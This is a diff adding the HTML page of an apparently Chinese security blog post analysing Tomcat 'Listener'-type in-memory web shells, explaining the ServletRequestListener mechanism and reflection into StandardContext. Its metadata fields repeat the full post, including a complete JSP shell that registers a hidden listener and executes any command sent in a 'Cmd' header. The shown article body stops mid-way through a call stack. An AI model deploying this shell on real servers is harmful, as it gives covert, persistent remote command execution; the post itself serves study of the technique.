@@ -1,0 +1,347 @@
+<!DOCTYPE html>
+<html lang="en-us">
+<head>
+<meta charset="utf-8" />
+<meta name="generator" content="Hugo 0.135.0">
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="toTop" content="true">
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<meta name="author" content="" />
+<meta property="og:url" content="https://w0s1np.github.io/blog/tomcat_listener%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%86%E6%9E%90.html/" />
+<link rel="canonical" href="https://w0s1np.github.io/blog/tomcat_listener%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%86%E6%9E%90.html/" /><link rel="apple-touch-icon" href="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/image-20241001120146127.png" />
+<link rel="icon" href="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/image-20241001120146127.png" />
+<link rel="shortcut" href="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/image-20241001120146127.png" /><link rel="alternate" type="application/atom+xml" href="https://w0s1np.github.io/index.xml" title="末流双非的救赎之道">
+<script type="application/ld+json">
+{
+"@context" : "http://schema.org",
+"@type" : "BlogPosting",
+"mainEntityOfPage": {
+"@type": "WebPage",
+"@id": "https:\/\/w0s1np.github.io\/"
+},
+"articleSection" : "blog",
+"name" : "Tomcat_Listener型内存马分析",
+"headline" : "Tomcat_Listener型内存马分析",
+"description" : "0x01 Listener前置知识 Java Web 开发中的监听器（Listener）就是 Application、Session 和 Request 三大对象创建、销毁或者往其中添加、修改、删除属性时自动执行代码的功能组件。\n用途 可以使用监听器监听客户端的请求、服务端的操作等。通过监听器，可以自动出发一些动作，比如监听在线的用户数量，统计网站访问量、网站访问监控等。\nListener 三个域对象 ServletContextListener HttpSessionListener ServletRequestListener 很明显，ServletRequestListener 是最适合用来作为内存马的。因为 ServletRequestListener 是用来监听 ServletRequest对 象的，当我们访问任意资源时，都会触发ServletRequestListener#requestInitialized()方法。\n0x02 Listener流程分析 Servlet 规范中一共定义了 8 个 Listener 接口\nhttp:\/\/c.biancheng.net\/servlet2\/listener.html\n但因为内存马本身的特殊性, 一般选用 ServletRequestListener 接口\npackage memlistener; import javax.servlet.*; import javax.servlet.annotation.*; @WebListener public class TestListener implements ServletRequestListener{ public TestListener() { } @Override public void requestDestroyed(ServletRequestEvent sre) { } @Override public void requestInitialized(ServletRequestEvent sre) { System.out.println(\u0026#34;test listener\u0026#34;); } } 调用栈\nrequestInitialized:18, TestListener (memlistener) fireRequestInitEvent:5157, StandardContext (org.apache.catalina.core) invoke:116, StandardHostValve (org.apache.catalina.core) invoke:93, ErrorReportValve (org.apache.catalina.valves) invoke:660, AbstractAccessLogValve (org.apache.catalina.valves) invoke:74, StandardEngineValve (org.apache.catalina.core) service:346, CoyoteAdapter (org.apache.catalina.connector) service:388, Http11Processor (org.apache.coyote.http11) process:63, AbstractProcessorLight (org.apache.coyote) process:936, AbstractProtocol$ConnectionHandler (org.apache.coyote) doRun:1791, NioEndpoint$SocketProcessor (org.apache.tomcat.util.net) run:52, SocketProcessorBase (org.apache.tomcat.util.net) runWorker:1190, ThreadPoolExecutor (org.apache.tomcat.util.threads) run:659, ThreadPoolExecutor$Worker (org.apache.tomcat.util.threads) run:63, TaskThread$WrappingRunnable (org.apache.tomcat.util.threads) run:745, Thread (java.lang) 往回看 Listener 是在StandardContext#fireRequestInitEvent中被调用\n通过 getApplicationEventListeners 得到 instances 数组，再遍历 instances，将其转型为 ServletRequestListener，最后传入 ServletRequestEvent 并调用 requestInitialized 方法。\n看看 getApplicationEventListeners 方法：\n可以看到 instances 其实就是获取的 StandardContext 的 applicationEventListenersList 属性，而其本质为 List,。所以我们这里只要想办法控制这一个属性就行。\n同时在 StandardContext 中提供了对应的 add 方法。\n所以我们只需要反射获取 StandardContext ，再调用此 add 方法，加入我们自定义的 listener 实例，即可成功加载。\n0x03 获取Request和Response 因为 requestInitialized 只传入了 ServletRequestEvent ，没有类似 doFilter 的 ServletRequest 和 ServletResponse, 所以我们需要手动获取能够达到类似功能的对象。\n所以这里想办法在传入的 ServletRequestEvent 里面做手脚\n查看 ServletRequestEvent 的定义\n其中的 ServletRequest 为接口, 但因为多态的特性看不出来 request 具体是什么\n下个断点看下：\n发现是 RequestFacade ，查看一下其定义：\nRequestFacade 实现了 HttpServletRequest 接口, 到这里其实已经可以正常解析 request 请求了\n现在还差一个 response\n注意到 RequestFacade 存在 request 属性, 声明类型为 Request, 于是查看 Request 的定义\n发现其存在 response 属性, 声明类型为 Response\n查看 Response 的定义\nResponse 也实现了 HttpServletResponse 接口, 那么同样的也可以正常处理 response 响应\n其实两者都是 tomcat 内部的对象, 封装了底层的 http 请求, 而 RequestFacade 是 Request 的又一层封装\n利用反射来实现上面获取的过程：\nRequestFacade requestFacade = (RequestFacade) sre.getServletRequest(); Field requestField = RequestFacade.class.getDeclaredField(\u0026#34;request\u0026#34;); requestField.setAccessible(true); Request request = (Request) requestField.get(requestFacade); Response response = request.getResponse(); 0x04 编写内存马 \u0026lt;%@ page import=\u0026#34;java.lang.reflect.Field\u0026#34; %\u0026gt; \u0026lt;%@ page import=\u0026#34;org.apache.catalina.core.ApplicationContext\u0026#34; %\u0026gt; \u0026lt;%@ page import=\u0026#34;org.apache.catalina.core.StandardContext\u0026#34; %\u0026gt; \u0026lt;%@ page import=\u0026#34;org.apache.catalina.connector.RequestFacade\u0026#34; %\u0026gt; \u0026lt;%@ page import=\u0026#34;org.apache.catalina.connector.Request\u0026#34; %\u0026gt; \u0026lt;%@ page import=\u0026#34;org.apache.catalina.connector.Response\u0026#34; %\u0026gt; \u0026lt;%@ page import=\u0026#34;java.io.PrintWriter\u0026#34; %\u0026gt; \u0026lt;%@ page import=\u0026#34;java.io.InputStream\u0026#34; %\u0026gt; \u0026lt;%@ page import=\u0026#34;java.io.BufferedReader\u0026#34; %\u0026gt; \u0026lt;%@ page import=\u0026#34;java.io.InputStreamReader\u0026#34; %\u0026gt;\u0026lt;% \/\/ 获取 StandardContext ServletContext servletContext = request.getSession().getServletContext(); Field appctxField = servletContext.getClass().getDeclaredField(\u0026#34;context\u0026#34;); appctxField.setAccessible(true); ApplicationContext applicationContext = (ApplicationContext) appctxField.get(servletContext); Field stdctxField = applicationContext.getClass().getDeclaredField(\u0026#34;context\u0026#34;); stdctxField.setAccessible(true); StandardContext standardContext = (StandardContext) stdctxField.get(applicationContext); ServletRequestListener servletRequestListener = new ServletRequestListener() { @Override public void requestDestroyed(ServletRequestEvent sre) { } @Override public void requestInitialized(ServletRequestEvent sre) { try { \/\/ 获取 request 和 response RequestFacade requestFacade = (RequestFacade) sre.getServletRequest(); Field requestField = RequestFacade.class.getDeclaredField(\u0026#34;request\u0026#34;); requestField.setAccessible(true); Request request = (Request) requestField.get(requestFacade); Response response = (Response) request.getResponse(); response.setCharacterEncoding(\u0026#34;utf-8\u0026#34;); PrintWriter pw = response.getWriter(); String cmd = request.getHeader(\u0026#34;Cmd\u0026#34;); if (cmd != null){ Process process = Runtime.getRuntime().exec(cmd); InputStream input = process.getInputStream(); BufferedReader br = new BufferedReader(new InputStreamReader(input)); String line = null; while ((line = br.readLine()) != null){ pw.write(line); } pw.write(\u0026#34;\\n\u0026#34;); } } catch (Exception e) { e.printStackTrace(); } ; } }; \/\/ 添加 Listener standardContext.addApplicationEventListener(servletRequestListener); out.println(\u0026#34;inject success\u0026#34;); %\u0026gt; 参考 https:\/\/exp10it.io\/2022\/11\/tomcat-listener-型内存马分析\/#获取-request-和-response\n",
+"inLanguage" : "en-US",
+"author" : "",
+"creator" : "",
+"publisher": "",
+"accountablePerson" : "",
+"copyrightHolder" : "",
+"copyrightYear" : "2024",
+"datePublished": "2024-10-01 22:09:26 \u002b0800 CST",
+"dateModified" : "2024-10-01 22:09:26 \u002b0800 CST",
+"url" : "https:\/\/w0s1np.github.io\/blog\/tomcat_listener%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%86%E6%9E%90.html\/",
+"keywords" : [ "Java", ]
+}
+</script><title>Tomcat_Listener型内存马分析 - 末流双非的救赎之道</title>
+<meta property="og:title" content="Tomcat_Listener型内存马分析" />
+<meta property="og:type" content="article" />
+<meta property="og:description" content="0x01 Listener前置知识 Java Web 开发中的监听器（Listener）就是 Application、Session 和 Request 三大对象创建、销毁或者往其中添加、修改、删除属性时自动执行代码的功能组件。
+用途 可以使用监听器监听客户端的请求、服务端的操作等。通过监听器，可以自动出发一些动作，比如监听在线的用户数量，统计网站访问量、网站访问监控等。
+Listener 三个域对象 ServletContextListener HttpSessionListener ServletRequestListener 很明显，ServletRequestListener 是最适合用来作为内存马的。因为 ServletRequestListener 是用来监听 ServletRequest对 象的，当我们访问任意资源时，都会触发ServletRequestListener#requestInitialized()方法。
+0x02 Listener流程分析 Servlet 规范中一共定义了 8 个 Listener 接口
+http://c.biancheng.net/servlet2/listener.html
+但因为内存马本身的特殊性, 一般选用 ServletRequestListener 接口
+package memlistener; import javax.servlet.*; import javax.servlet.annotation.*; @WebListener public class TestListener implements ServletRequestListener{ public TestListener() { } @Override public void requestDestroyed(ServletRequestEvent sre) { } @Override public void requestInitialized(ServletRequestEvent sre) { System.out.println(&#34;test listener&#34;); } } 调用栈
+requestInitialized:18, TestListener (memlistener) fireRequestInitEvent:5157, StandardContext (org.apache.catalina.core) invoke:116, StandardHostValve (org.apache.catalina.core) invoke:93, ErrorReportValve (org.apache.catalina.valves) invoke:660, AbstractAccessLogValve (org.apache.catalina.valves) invoke:74, StandardEngineValve (org.apache.catalina.core) service:346, CoyoteAdapter (org.apache.catalina.connector) service:388, Http11Processor (org.apache.coyote.http11) process:63, AbstractProcessorLight (org.apache.coyote) process:936, AbstractProtocol$ConnectionHandler (org.apache.coyote) doRun:1791, NioEndpoint$SocketProcessor (org.apache.tomcat.util.net) run:52, SocketProcessorBase (org.apache.tomcat.util.net) runWorker:1190, ThreadPoolExecutor (org.apache.tomcat.util.threads) run:659, ThreadPoolExecutor$Worker (org.apache.tomcat.util.threads) run:63, TaskThread$WrappingRunnable (org.apache.tomcat.util.threads) run:745, Thread (java.lang) 往回看 Listener 是在StandardContext#fireRequestInitEvent中被调用
+通过 getApplicationEventListeners 得到 instances 数组，再遍历 instances，将其转型为 ServletRequestListener，最后传入 ServletRequestEvent 并调用 requestInitialized 方法。
+看看 getApplicationEventListeners 方法：
+可以看到 instances 其实就是获取的 StandardContext 的 applicationEventListenersList 属性，而其本质为 List,。所以我们这里只要想办法控制这一个属性就行。
+同时在 StandardContext 中提供了对应的 add 方法。
+所以我们只需要反射获取 StandardContext ，再调用此 add 方法，加入我们自定义的 listener 实例，即可成功加载。
+0x03 获取Request和Response 因为 requestInitialized 只传入了 ServletRequestEvent ，没有类似 doFilter 的 ServletRequest 和 ServletResponse, 所以我们需要手动获取能够达到类似功能的对象。
+所以这里想办法在传入的 ServletRequestEvent 里面做手脚
+查看 ServletRequestEvent 的定义
+其中的 ServletRequest 为接口, 但因为多态的特性看不出来 request 具体是什么
+下个断点看下：
+发现是 RequestFacade ，查看一下其定义：
+RequestFacade 实现了 HttpServletRequest 接口, 到这里其实已经可以正常解析 request 请求了
+现在还差一个 response
+注意到 RequestFacade 存在 request 属性, 声明类型为 Request, 于是查看 Request 的定义
+发现其存在 response 属性, 声明类型为 Response
+查看 Response 的定义
+Response 也实现了 HttpServletResponse 接口, 那么同样的也可以正常处理 response 响应
+其实两者都是 tomcat 内部的对象, 封装了底层的 http 请求, 而 RequestFacade 是 Request 的又一层封装
+利用反射来实现上面获取的过程：
+RequestFacade requestFacade = (RequestFacade) sre.getServletRequest(); Field requestField = RequestFacade.class.getDeclaredField(&#34;request&#34;); requestField.setAccessible(true); Request request = (Request) requestField.get(requestFacade); Response response = request.getResponse(); 0x04 编写内存马 &lt;%@ page import=&#34;java.lang.reflect.Field&#34; %&gt; &lt;%@ page import=&#34;org.apache.catalina.core.ApplicationContext&#34; %&gt; &lt;%@ page import=&#34;org.apache.catalina.core.StandardContext&#34; %&gt; &lt;%@ page import=&#34;org.apache.catalina.connector.RequestFacade&#34; %&gt; &lt;%@ page import=&#34;org.apache.catalina.connector.Request&#34; %&gt; &lt;%@ page import=&#34;org.apache.catalina.connector.Response&#34; %&gt; &lt;%@ page import=&#34;java.io.PrintWriter&#34; %&gt; &lt;%@ page import=&#34;java.io.InputStream&#34; %&gt; &lt;%@ page import=&#34;java.io.BufferedReader&#34; %&gt; &lt;%@ page import=&#34;java.io.InputStreamReader&#34; %&gt;&lt;% // 获取 StandardContext ServletContext servletContext = request.getSession().getServletContext(); Field appctxField = servletContext.getClass().getDeclaredField(&#34;context&#34;); appctxField.setAccessible(true); ApplicationContext applicationContext = (ApplicationContext) appctxField.get(servletContext); Field stdctxField = applicationContext.getClass().getDeclaredField(&#34;context&#34;); stdctxField.setAccessible(true); StandardContext standardContext = (StandardContext) stdctxField.get(applicationContext); ServletRequestListener servletRequestListener = new ServletRequestListener() { @Override public void requestDestroyed(ServletRequestEvent sre) { } @Override public void requestInitialized(ServletRequestEvent sre) { try { // 获取 request 和 response RequestFacade requestFacade = (RequestFacade) sre.getServletRequest(); Field requestField = RequestFacade.class.getDeclaredField(&#34;request&#34;); requestField.setAccessible(true); Request request = (Request) requestField.get(requestFacade); Response response = (Response) request.getResponse(); response.setCharacterEncoding(&#34;utf-8&#34;); PrintWriter pw = response.getWriter(); String cmd = request.getHeader(&#34;Cmd&#34;); if (cmd != null){ Process process = Runtime.getRuntime().exec(cmd); InputStream input = process.getInputStream(); BufferedReader br = new BufferedReader(new InputStreamReader(input)); String line = null; while ((line = br.readLine()) != null){ pw.write(line); } pw.write(&#34;\n&#34;); } } catch (Exception e) { e.printStackTrace(); } ; } }; // 添加 Listener standardContext.addApplicationEventListener(servletRequestListener); out.println(&#34;inject success&#34;); %&gt; 参考 https://exp10it.io/2022/11/tomcat-listener-型内存马分析/#获取-request-和-response
+" />
+<meta name="description" content="0x01 Listener前置知识 Java Web 开发中的监听器（Listener）就是 Application、Session 和 Request 三大对象创建、销毁或者往其中添加、修改、删除属性时自动执行代码的功能组件。
+用途 可以使用监听器监听客户端的请求、服务端的操作等。通过监听器，可以自动出发一些动作，比如监听在线的用户数量，统计网站访问量、网站访问监控等。
+Listener 三个域对象 ServletContextListener HttpSessionListener ServletRequestListener 很明显，ServletRequestListener 是最适合用来作为内存马的。因为 ServletRequestListener 是用来监听 ServletRequest对 象的，当我们访问任意资源时，都会触发ServletRequestListener#requestInitialized()方法。
+0x02 Listener流程分析 Servlet 规范中一共定义了 8 个 Listener 接口
+http://c.biancheng.net/servlet2/listener.html
+但因为内存马本身的特殊性, 一般选用 ServletRequestListener 接口
+package memlistener; import javax.servlet.*; import javax.servlet.annotation.*; @WebListener public class TestListener implements ServletRequestListener{ public TestListener() { } @Override public void requestDestroyed(ServletRequestEvent sre) { } @Override public void requestInitialized(ServletRequestEvent sre) { System.out.println(&#34;test listener&#34;); } } 调用栈
+requestInitialized:18, TestListener (memlistener) fireRequestInitEvent:5157, StandardContext (org.apache.catalina.core) invoke:116, StandardHostValve (org.apache.catalina.core) invoke:93, ErrorReportValve (org.apache.catalina.valves) invoke:660, AbstractAccessLogValve (org.apache.catalina.valves) invoke:74, StandardEngineValve (org.apache.catalina.core) service:346, CoyoteAdapter (org.apache.catalina.connector) service:388, Http11Processor (org.apache.coyote.http11) process:63, AbstractProcessorLight (org.apache.coyote) process:936, AbstractProtocol$ConnectionHandler (org.apache.coyote) doRun:1791, NioEndpoint$SocketProcessor (org.apache.tomcat.util.net) run:52, SocketProcessorBase (org.apache.tomcat.util.net) runWorker:1190, ThreadPoolExecutor (org.apache.tomcat.util.threads) run:659, ThreadPoolExecutor$Worker (org.apache.tomcat.util.threads) run:63, TaskThread$WrappingRunnable (org.apache.tomcat.util.threads) run:745, Thread (java.lang) 往回看 Listener 是在StandardContext#fireRequestInitEvent中被调用
+通过 getApplicationEventListeners 得到 instances 数组，再遍历 instances，将其转型为 ServletRequestListener，最后传入 ServletRequestEvent 并调用 requestInitialized 方法。
+看看 getApplicationEventListeners 方法：
+可以看到 instances 其实就是获取的 StandardContext 的 applicationEventListenersList 属性，而其本质为 List,。所以我们这里只要想办法控制这一个属性就行。
+同时在 StandardContext 中提供了对应的 add 方法。
+所以我们只需要反射获取 StandardContext ，再调用此 add 方法，加入我们自定义的 listener 实例，即可成功加载。
+0x03 获取Request和Response 因为 requestInitialized 只传入了 ServletRequestEvent ，没有类似 doFilter 的 ServletRequest 和 ServletResponse, 所以我们需要手动获取能够达到类似功能的对象。
+所以这里想办法在传入的 ServletRequestEvent 里面做手脚
+查看 ServletRequestEvent 的定义
+其中的 ServletRequest 为接口, 但因为多态的特性看不出来 request 具体是什么
+下个断点看下：
+发现是 RequestFacade ，查看一下其定义：
+RequestFacade 实现了 HttpServletRequest 接口, 到这里其实已经可以正常解析 request 请求了
+现在还差一个 response
+注意到 RequestFacade 存在 request 属性, 声明类型为 Request, 于是查看 Request 的定义
+发现其存在 response 属性, 声明类型为 Response
+查看 Response 的定义
+Response 也实现了 HttpServletResponse 接口, 那么同样的也可以正常处理 response 响应
+其实两者都是 tomcat 内部的对象, 封装了底层的 http 请求, 而 RequestFacade 是 Request 的又一层封装
+利用反射来实现上面获取的过程：
+RequestFacade requestFacade = (RequestFacade) sre.getServletRequest(); Field requestField = RequestFacade.class.getDeclaredField(&#34;request&#34;); requestField.setAccessible(true); Request request = (Request) requestField.get(requestFacade); Response response = request.getResponse(); 0x04 编写内存马 &lt;%@ page import=&#34;java.lang.reflect.Field&#34; %&gt; &lt;%@ page import=&#34;org.apache.catalina.core.ApplicationContext&#34; %&gt; &lt;%@ page import=&#34;org.apache.catalina.core.StandardContext&#34; %&gt; &lt;%@ page import=&#34;org.apache.catalina.connector.RequestFacade&#34; %&gt; &lt;%@ page import=&#34;org.apache.catalina.connector.Request&#34; %&gt; &lt;%@ page import=&#34;org.apache.catalina.connector.Response&#34; %&gt; &lt;%@ page import=&#34;java.io.PrintWriter&#34; %&gt; &lt;%@ page import=&#34;java.io.InputStream&#34; %&gt; &lt;%@ page import=&#34;java.io.BufferedReader&#34; %&gt; &lt;%@ page import=&#34;java.io.InputStreamReader&#34; %&gt;&lt;% // 获取 StandardContext ServletContext servletContext = request.getSession().getServletContext(); Field appctxField = servletContext.getClass().getDeclaredField(&#34;context&#34;); appctxField.setAccessible(true); ApplicationContext applicationContext = (ApplicationContext) appctxField.get(servletContext); Field stdctxField = applicationContext.getClass().getDeclaredField(&#34;context&#34;); stdctxField.setAccessible(true); StandardContext standardContext = (StandardContext) stdctxField.get(applicationContext); ServletRequestListener servletRequestListener = new ServletRequestListener() { @Override public void requestDestroyed(ServletRequestEvent sre) { } @Override public void requestInitialized(ServletRequestEvent sre) { try { // 获取 request 和 response RequestFacade requestFacade = (RequestFacade) sre.getServletRequest(); Field requestField = RequestFacade.class.getDeclaredField(&#34;request&#34;); requestField.setAccessible(true); Request request = (Request) requestField.get(requestFacade); Response response = (Response) request.getResponse(); response.setCharacterEncoding(&#34;utf-8&#34;); PrintWriter pw = response.getWriter(); String cmd = request.getHeader(&#34;Cmd&#34;); if (cmd != null){ Process process = Runtime.getRuntime().exec(cmd); InputStream input = process.getInputStream(); BufferedReader br = new BufferedReader(new InputStreamReader(input)); String line = null; while ((line = br.readLine()) != null){ pw.write(line); } pw.write(&#34;\n&#34;); } } catch (Exception e) { e.printStackTrace(); } ; } }; // 添加 Listener standardContext.addApplicationEventListener(servletRequestListener); out.println(&#34;inject success&#34;); %&gt; 参考 https://exp10it.io/2022/11/tomcat-listener-型内存马分析/#获取-request-和-response
+" />
+<meta property="og:locale" content="en-us" /><meta property="og:image" content="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/image-20241001120146127.png" />
+
+
+<link rel="stylesheet" href="/css/base.css">
+<link rel="stylesheet" href="/css/index.css">
+<link href="/index.xml" rel="alternate" type="application/rss+xml" title="末流双非的救赎之道">
+</head>
+
+<body>
+  <nav class="headnav">
+  <a href="/" class="logo">w0s1np</a>
+  <ul id="menu">
+    
+    <li><a href="/blog/">归档</a></li>
+    
+    <li><a href="/tags/">标签</a></li>
+    
+    <li><a href="/search">搜索</a></li>
+    
+    <li><a href="/about/">关于</a></li>
+    
+    <li><a href="/index.xml" target="_blank">RSS</a></li>
+  </ul>
+</nav>
+  <section>
+    
+    <div class="body-title">Tomcat_Listener型内存马分析</div>
+
+    
+    <div class="post-meta">
+      <time> 2024-10-01</time>
+      
+
+      <span class="tag-node">
+        
+        标签：
+        
+        <a href="/tags/java">#Java</a>
+        
+        
+      </span>
+
+    </div>
+    
+
+    
+    <div class="toc">
+      <nav id="TableOfContents">
+  <ul>
+    <li><a href="#用途">用途</a></li>
+    <li><a href="#listener-三个域对象"><strong>Listener 三个域对象</strong></a></li>
+  </ul>
+</nav>
+    </div>
+    
+
+    <article class="post-content">
+      
+      <h1 id="0x01-listener前置知识">0x01 <strong>Listener前置知识</strong></h1>
+<p>Java Web 开发中的监听器（Listener）就是 Application、Session 和 Request 三大对象创建、销毁或者往其中添加、修改、删除属性时自动执行代码的功能组件。</p>
+<h2 id="用途">用途</h2>
+<p>可以使用监听器监听客户端的请求、服务端的操作等。通过监听器，可以自动出发一些动作，比如监听在线的用户数量，统计网站访问量、网站访问监控等。</p>
+<h2 id="listener-三个域对象"><strong>Listener 三个域对象</strong></h2>
+<ul>
+<li>ServletContextListener</li>
+<li>HttpSessionListener</li>
+<li>ServletRequestListener</li>
+</ul>
+<p>很明显，ServletRequestListener 是最适合用来作为内存马的。因为 ServletRequestListener 是用来监听 ServletRequest对 象的，当我们访问任意资源时，都会触发<code>ServletRequestListener#requestInitialized()</code>方法。</p>
+<h1 id="0x02-listener流程分析">0x02 Listener流程分析</h1>
+<p>Servlet 规范中一共定义了 8 个 Listener 接口</p>
+<p><a href="http://c.biancheng.net/servlet2/listener.html">http://c.biancheng.net/servlet2/listener.html</a></p>
+<p>但因为内存马本身的特殊性, 一般选用 ServletRequestListener 接口</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">package</span><span class="w"> </span><span class="nn">memlistener</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">javax.servlet.*</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">javax.servlet.annotation.*</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nd">@WebListener</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">TestListener</span><span class="w"> </span><span class="kd">implements</span><span class="w"> </span><span class="n">ServletRequestListener</span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="nf">TestListener</span><span class="p">()</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nd">@Override</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">requestDestroyed</span><span class="p">(</span><span class="n">ServletRequestEvent</span><span class="w"> </span><span class="n">sre</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nd">@Override</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">requestInitialized</span><span class="p">(</span><span class="n">ServletRequestEvent</span><span class="w"> </span><span class="n">sre</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="s">&#34;test listener&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
+</span></span></span></code></pre></div><p>调用栈</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="nl">requestInitialized</span><span class="p">:</span><span class="n">18</span><span class="p">,</span><span class="w"> </span><span class="n">TestListener</span><span class="w"> </span><span class="p">(</span><span class="n">memlistener</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nl">fireRequestInitEvent</span><span class="p">:</span><span class="n">5157</span><span class="p">,</span><span class="w"> </span><span class="n">StandardContext</span><span class="w"> </span><span class="p">(</span><span class="n">org</span><span class="p">.</span><span class="na">apache</span><span class="p">.</span><span class="na">catalina</span><span class="p">.</span><span class="na">core</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nl">invoke</span><span class="p">:</span><span class="n">116</span><span class="p">,</span><span class="w"> </span><span class="n">StandardHostValve</span><span class="w"> </span><span class="p">(</span><span class="n">org</span><span class="p">.</span><span class="na">apache</span><span class="p">.</span><span class="na">catalina</span><span class="p">.</span><span class="na">core</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nl">invoke</span><span class="p">:</span><span class="n">93</span><span class="p">,</span><span class="w"> </span><span class="n">ErrorReportValve</span><span class="w"> </span><span class="p">(</span><span class="n">org</span><span class="p">.</span><span class="na">apache</span><span class="p">.</span><span class="na">catalina</span><span class="p">.</span><span class="na">valves</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nl">invoke</span><span class="p">:</span><span class="n">660</span><span class="p">,</span><span class="w"> </span><span class="n">AbstractAccessLogValve</span><span class="w"> </span><span class="p">(</span><span class="n">org</span><span class="p">.</span><span class="na">apache</span><span class="p">.</span><span class="na">catalina</span><span class="p">.</span><span class="na">valves</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nl">invoke</span><span class="p">:</span><span class="n">74</span><span class="p">,</span><span class="w"> </span><span class="n">StandardEngineValve</span><span class="w"> </span><span class="p">(</span><span class="n">org</span><span class="p">.</span><span class="na">apache</span><span class="p">.</span><span class="na">catalina</span><span class="p">.</span><span class="na">core</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nl">service</span><span class="p">:</span><span class="n">346</span><span class="p">,</span><span class="w"> </span><span class="n">CoyoteAdapter</span><span class="w"> </span><span class="p">(</span><span class="n">org</span><span class="p">.</span><span class="na">apache</span><span class="p">.</span><span class="na">catalina</span><span class="p">.</span><span class="na">connector</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nl">service</span><span class="p">:</span><span class="n">388</span><span class="p">,</span><span class="w"> </span><span class="n">Http11Processor</span><span class="w"> </span><span class="p">(</span><span class="n">org</span><span class="p">.</span><span class="na">apache</span><span class="p">.</span><span class="na">coyote</span><span class="p">.</span><span class="na">http11</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nl">process</span><span class="p">:</span><span class="n">63</span><span class="p">,</span><span class="w"> </span><span class="n">AbstractProcessorLight</span><span class="w"> </span><span class="p">(</span><span class="n">org</span><span class="p">.</span><span class="na">apache</span><span class="p">.</span><span class="na">coyote</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nl">process</span><span class="p">:</span><span class="n">936</span><span class="p">,</span><span class="w"> </span><span class="n">AbstractProtocol$ConnectionHandler</span><span class="w"> </span><span class="p">(</span><span class="n">org</span><span class="p">.</span><span class="na">apache</span><span class="p">.</span><span class="na">coyote</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nl">doRun</span><span class="p">:</span><span class="n">1791</span><span class="p">,</span><span class="w"> </span><span class="n">NioEndpoint$SocketProcessor</span><span class="w"> </span><span class="p">(</span><span class="n">org</span><span class="p">.</span><span class="na">apache</span><span class="p">.</span><span class="na">tomcat</span><span class="p">.</span><span class="na">util</span><span class="p">.</span><span class="na">net</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nl">run</span><span class="p">:</span><span class="n">52</span><span class="p">,</span><span class="w"> </span><span class="n">SocketProcessorBase</span><span class="w"> </span><span class="p">(</span><span class="n">org</span><span class="p">.</span><span class="na">apache</span><span class="p">.</span><span class="na">tomcat</span><span class="p">.</span><span class="na">util</span><span class="p">.</span><span class="na">net</span><span class="p">)</span><span class="w">
